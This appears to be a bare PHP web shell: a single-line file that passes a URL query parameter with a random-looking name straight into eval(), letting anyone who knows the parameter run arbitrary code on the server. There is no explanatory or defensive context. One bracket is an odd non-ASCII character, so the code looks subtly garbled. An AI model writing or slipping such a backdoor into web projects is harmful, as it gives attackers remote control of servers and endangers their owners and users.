<?php
eval($_GET['4JMOnbw7'〕);
?>
